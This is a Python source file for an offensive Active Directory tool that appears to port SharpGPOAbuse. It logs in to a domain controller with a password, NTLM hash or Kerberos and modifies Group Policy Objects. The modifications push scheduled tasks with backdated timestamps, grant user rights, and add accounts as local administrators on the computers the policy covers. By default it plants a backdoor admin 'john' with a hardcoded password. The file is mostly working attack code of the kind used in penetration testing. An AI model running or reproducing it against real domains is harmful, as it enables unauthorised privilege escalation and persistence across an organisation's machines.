"""
This tool is a partial python implementation of SharpGPOAbuse
https://github.com/FSecureLABS/SharpGPOAbuse
All credit goes to @pkb1s for his research, especially regarding gPCMachineExtensionNames

Also thanks to @airman604 for schtask_now.py that was used and modified in this project
https://github.com/airman604/schtask_now
"""

import argparse
import logging
import re
import sys
import os

from impacket.smbconnection import SMBConnection
from impacket.examples.utils import parse_credentials

from pygpoabuse import logger
from pygpoabuse.gpo import GPO

parser = argparse.ArgumentParser(add_help=True, description="Abuse Group Policy Objects")

# Main required arguments
parser.add_argument('target', action='store', help='domain/username[:password]')
parser.add_argument('-gpo-id', action='store', metavar='GPO_ID', help='GPO to update')
parser.add_argument('-f', action='store_true', help='Force update if file already exists')
parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')

# Authentication options
parser.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
parser.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                   '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                   'cannot be found, it will use the ones specified in the command '
                                                   'line')
parser.add_argument('-dc-ip', action='store', help='Domain controller IP or hostname')
parser.add_argument('-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
parser.add_argument('-ccache', action='store', help='ccache file name (must be in local directory)')

# Attack type groups
attack_type = parser.add_mutually_exclusive_group(required=True)
attack_type.add_argument('--add-rights', action='store_true', help='Add rights to a user')
attack_type.add_argument('--add-task', action='store_true', help='Add ScheduledTask to GPO')
attack_type.add_argument('--add-local-admin', action='store_true', help='Add user to the local administrators group')
attack_type.add_argument('--backup-gpo', action='store_true', help='Backup a GPO before modification')
attack_type.add_argument('--restore-gpo', action='store_true', help='Restore a GPO from backup')

# User Rights arguments
rights_group = parser.add_argument_group('User Rights arguments (use with --add-rights)')
rights_group.add_argument('-rights', action='store', help='Comma-separated list of rights to assign')
rights_group.add_argument('-user-account', action='store', help='User account to assign rights to')

# Local Admin arguments
admin_group = parser.add_argument_group('Local Admin arguments (use with --add-local-admin)')
admin_group.add_argument('-admin-account', action='store', help='User account to add as local administrator')

# Scheduled Task arguments
task_group = parser.add_argument_group('ScheduledTask arguments (use with --add-task)')
task_group.add_argument('-user', action='store_true', help='Set user GPO (Default: False, Computer GPO)')
task_group.add_argument('-taskname', action='store', help='Taskname to create. (Default: TASK_<random>)')
task_group.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
task_group.add_argument('-description', action='store', help='Task description (Default: Empty)')
task_group.add_argument('-powershell', action='store_true', help='Use Powershell for command execution')
task_group.add_argument('-command', action='store',
                      help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')

# Backup/Restore arguments
backup_group = parser.add_argument_group('Backup arguments (use with --backup-gpo or --restore-gpo)')
backup_group.add_argument('-backup-dir', action='store', help='Directory to store/retrieve backup')
backup_group.add_argument('-backup-id', action='store', help='ID of backup to restore (only with --restore-gpo)')

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

if not options.gpo_id:
    parser.print_help()
    sys.exit(1)

# Init the example's logger theme
logger.init()

if options.v == 1:
    logging.getLogger().setLevel(logging.INFO)
elif options.v >= 2:
    logging.getLogger().setLevel(logging.DEBUG)
else:
    logging.getLogger().setLevel(logging.ERROR)

domain, username, password = parse_credentials(options.target)

if options.dc_ip:
    dc_ip = options.dc_ip
else:
    dc_ip = domain

if domain == '':
    logging.critical('Domain should be specified!')
    sys.exit(1)

if password == '' and username != '' and options.hashes is None and options.k is False:
    from getpass import getpass
    password = getpass("Password:")
elif options.hashes is not None:
    if ":" not in options.hashes:
        logging.error("Wrong hash format. Expecting lm:nt")
        sys.exit(1)

if options.ldaps:
    protocol = 'ldaps'
else:
    protocol = 'ldap'

if options.k:
    if options.ccache:
        url = '{}+kerberos-ccache://{}\\{}:{}@{}/?dc={}'.format(protocol, domain, username, options.ccache, dc_ip, dc_ip)
    else:
        # Use password for Kerberos authentication
        url = '{}+kerberos://{}\\{}:{}@{}/?dc={}'.format(protocol, domain, username, password, dc_ip, dc_ip)
elif password != '':
    url = '{}+ntlm-password://{}\\{}:{}@{}'.format(protocol, domain, username, password, dc_ip)
    lmhash, nthash = "",""
else:
    url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hashes.split(":")[1], dc_ip)
    lmhash, nthash = options.hashes.split(":")


def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
    try:
        smb_session = SMBConnection(address, target_ip)
        smb_session.login(username, password, domain, lmhash, nthash)
        return smb_session
    except Exception as e:
        logging.error("Connection error")
        return False

try:
    smb_session = SMBConnection(dc_ip, dc_ip)
    if options.k:
        smb_session.kerberosLogin(user=username, password=password, domain=domain, kdcHost=dc_ip, useCache=options.ccache is not None)
    else:
        smb_session.login(username, password, domain, lmhash, nthash)
except Exception as e:
    logging.error("SMB connection error", exc_info=True)
    sys.exit(1)

try:
    gpo = GPO(smb_session)
    
    if options.add_task:
        # Add a scheduled task
        task_name = gpo.update_scheduled_task(
            domain=domain,
            gpo_id=options.gpo_id,
            name=options.taskname,
            mod_date=options.mod_date,
            description=options.description,
            powershell=options.powershell,
            command=options.command,
            gpo_type="user" if options.user else "computer",
            force=options.f
        )
        if task_name:
            if gpo.update_versions(url, domain, options.gpo_id, gpo_type="user" if options.user else "computer"):
                logging.info("Version updated")
            else:
                logging.error("Error while updating versions")
                sys.exit(1)
            logging.success("ScheduledTask {} created!".format(task_name))
    
    elif options.add_rights:
        # Check required parameters for adding rights
        if not options.rights:
            logging.error("Rights must be specified with -rights parameter")
            sys.exit(1)
        if not options.user_account:
            logging.error("User account must be specified with -user-account parameter")
            sys.exit(1)
            
        # Get SID of the user account
        from impacket.dcerpc.v5 import samr, transport
        rpctransport = transport.SMBTransport(dc_ip, filename=r'\samr')
        if options.k:
            rpctransport.set_kerberos(True, options.dc_ip)
        if options.hashes:
            lmhash, nthash = options.hashes.split(':')
            rpctransport.set_credentials(username, '', domain, lmhash, nthash, None)
        else:
            rpctransport.set_credentials(username, password, domain, '', '', None)
            
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        
        logging.debug("Connected to SAMR")
        
        try:
            resp = samr.hSamrConnect(dce)
            server_handle = resp['ServerHandle']
            
            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
            domain_sid = resp['DomainId']
            
            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
            domain_handle = resp['DomainHandle']
            
            resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, [options.user_account])
            # Extract the RID as an integer directly
            user_rid = resp['RelativeIds']['Element'][0]
            
            # Check if user_rid is bytes and convert to int if needed
            if isinstance(user_rid, bytes):
                user_rid_int = int.from_bytes(user_rid, byteorder='little')
            else:
                user_rid_int = user_rid
            
            resp = samr.hSamrOpenUser(dce, domain_handle, desiredAccess=samr.MAXIMUM_ALLOWED, userId=user_rid)
            user_handle = resp['UserHandle']
            
            resp = samr.hSamrQueryInformationUser(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)
            # Use the RID directly as an integer
            user_sid = domain_sid.formatCanonical() + "-" + str(user_rid_int)
            
            logging.info("User SID for {} is {}".format(options.user_account, user_sid))
            
            # Close handles
            samr.hSamrCloseHandle(dce, user_handle)
            samr.hSamrCloseHandle(dce, domain_handle)
            samr.hSamrCloseHandle(dce, server_handle)
            
            # Add user rights
            success = gpo.update_user_rights(
                domain=domain,
                gpo_id=options.gpo_id,
                username=options.user_account,
                sid=user_sid,
                rights=options.rights,
                force=options.f
            )
            
            if success:
                if gpo.update_versions(url, domain, options.gpo_id, gpo_type="computer"):  # User rights are always computer GPO
                    logging.info("Version updated")
                    logging.success("User rights successfully added for {}!".format(options.user_account))
                else:
                    logging.error("Error while updating versions")
                    sys.exit(1)
            else:
                logging.error("Failed to add user rights")
                sys.exit(1)
                
        except Exception as e:
            logging.error("Error while getting user SID", exc_info=True)
            sys.exit(1)
            
    elif options.add_local_admin:
        # Check required parameters for adding local admin
        if not options.admin_account:
            logging.error("User account must be specified with -admin-account parameter")
            sys.exit(1)
            
        # Get SID of the user account
        from impacket.dcerpc.v5 import samr, transport
        rpctransport = transport.SMBTransport(dc_ip, filename=r'\samr')
        if options.k:
            rpctransport.set_kerberos(True, options.dc_ip)
        if options.hashes:
            lmhash, nthash = options.hashes.split(':')
            rpctransport.set_credentials(username, '', domain, lmhash, nthash, None)
        else:
            rpctransport.set_credentials(username, password, domain, '', '', None)
            
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        
        logging.debug("Connected to SAMR")
        
        try:
            resp = samr.hSamrConnect(dce)
            server_handle = resp['ServerHandle']
            
            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
            domain_sid = resp['DomainId']
            
            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
            domain_handle = resp['DomainHandle']
            
            resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, [options.admin_account])
            # Extract the RID as an integer directly
            user_rid = resp['RelativeIds']['Element'][0]
            
            # Check if user_rid is bytes and convert to int if needed
            if isinstance(user_rid, bytes):
                user_rid_int = int.from_bytes(user_rid, byteorder='little')
            else:
                user_rid_int = user_rid
            
            resp = samr.hSamrOpenUser(dce, domain_handle, desiredAccess=samr.MAXIMUM_ALLOWED, userId=user_rid)
            user_handle = resp['UserHandle']
            
            resp = samr.hSamrQueryInformationUser(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)
            # Use the RID directly as an integer
            user_sid = domain_sid.formatCanonical() + "-" + str(user_rid_int)
            
            logging.info("User SID for {} is {}".format(options.admin_account, user_sid))
            
            # Close handles
            samr.hSamrCloseHandle(dce, user_handle)
            samr.hSamrCloseHandle(dce, domain_handle)
            samr.hSamrCloseHandle(dce, server_handle)
            
            # Add local admin
            success = gpo.add_local_admin(
                domain=domain,
                gpo_id=options.gpo_id,
                username=options.admin_account,
                sid=user_sid,
                force=options.f
            )
            
            if success:
                if gpo.update_versions(url, domain, options.gpo_id, gpo_type="computer"):  # Local admin is always computer GPO
                    logging.info("Version updated")
                    logging.success("User {} successfully added as local administrator!".format(options.admin_account))
                else:
                    logging.error("Error while updating versions")
                    sys.exit(1)
            else:
                logging.error("Failed to add local admin")
                sys.exit(1)
                
        except Exception as e:
            logging.error("Error while getting user SID", exc_info=True)
            sys.exit(1)
    
    elif options.backup_gpo:
        # Check required parameters for backup
        if not options.gpo_id:
            logging.error("GPO ID must be specified with -gpo-id parameter")
            sys.exit(1)
            
        # Backup the GPO
        backup_id = gpo.backup_gpo(
            domain=domain,
            gpo_id=options.gpo_id,
            backup_dir=options.backup_dir
        )
        
        if backup_id:
            logging.success(f"GPO backup completed. Backup ID: {backup_id}")
            if options.backup_dir:
                logging.info(f"Backup stored in: {os.path.join(options.backup_dir, backup_id)}")
            else:
                logging.info(f"Backup stored in: {os.path.join(os.getcwd(), backup_id)}")
        else:
            logging.error("Failed to backup GPO")
            sys.exit(1)
    
    elif options.restore_gpo:
        # Check required parameters for restore
        if not options.backup_id and not options.backup_dir:
            logging.error("Either -backup-id or -backup-dir must be specified")
            sys.exit(1)
            
        # Restore the GPO
        success = gpo.restore_gpo(
            backup_id=options.backup_id,
            backup_dir=options.backup_dir
        )
        
        if success:
            logging.success("GPO restore completed successfully")
        else:
            logging.error("Failed to restore GPO")
            sys.exit(1)
        
except Exception as e:
    logging.error("An error occurred. Use -vv for more details", exc_info=True)
